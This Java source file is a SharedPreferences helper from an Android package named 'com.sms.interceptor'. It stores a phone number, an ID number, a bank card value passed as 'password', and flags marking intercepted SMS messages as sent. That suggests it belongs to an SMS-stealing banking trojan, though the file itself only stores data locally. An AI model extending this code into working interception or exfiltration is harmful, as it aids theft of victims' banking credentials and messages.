package com.sms.interceptor;

import android.content.Context;
import android.content.SharedPreferences;

/**
 * Created by zhangfei on 15/9/22.
 */
public class PreferenceUtils {
    private static final String PREFERENCE = "preference.xml";

    public static boolean isRegistered(Context context){
        SharedPreferences preferences = context.getSharedPreferences(PREFERENCE, 0);
        return preferences.getBoolean("registered", false);
    }

    public static void setRegistered(Context context, boolean registered){
        SharedPreferences.Editor editor = context.getSharedPreferences(PREFERENCE, 0).edit();
        editor.putBoolean("registered", registered);
        editor.commit();
    }

    public static String getPhoneNumber(Context context){
        SharedPreferences preferences = context.getSharedPreferences(PREFERENCE, 0);
        return preferences.getString("phoneNum", "");
    }

    public static void setPhoneNumber(Context context, String phoneNum){
        SharedPreferences.Editor editor = context.getSharedPreferences(PREFERENCE, 0).edit();
        editor.putString("phoneNum", phoneNum);
        editor.commit();
    }

    public static String getIdNo(Context context) {
        SharedPreferences preferences = context.getSharedPreferences(PREFERENCE, 0);
        return preferences.getString("idNo", "");
    }

    public static void setIdNo(Context context, String idNo) {
        SharedPreferences.Editor editor = context.getSharedPreferences(PREFERENCE, 0).edit();
        editor.putString("idNo", idNo);
        editor.commit();
    }

    public static String getBankCard(Context context){
        SharedPreferences preferences = context.getSharedPreferences(PREFERENCE, 0);
        return preferences.getString("bankCard", "");
    }

    public static void setBankCard(Context context, String password){
        SharedPreferences.Editor editor = context.getSharedPreferences(PREFERENCE, 0).edit();
        editor.putString("bankCard", password);
        editor.commit();
    }

    public static void setSmsSent(Context context, long smsId){
        SharedPreferences.Editor editor = context.getSharedPreferences(PREFERENCE, 0).edit();
        editor.putBoolean(String.valueOf(smsId), true);
        editor.commit();
    }

    public static boolean isSmsSent(Context context, long smsId){
        SharedPreferences preferences = context.getSharedPreferences(PREFERENCE, 0);
        return preferences.getBoolean(String.valueOf(smsId), false);
    }
}
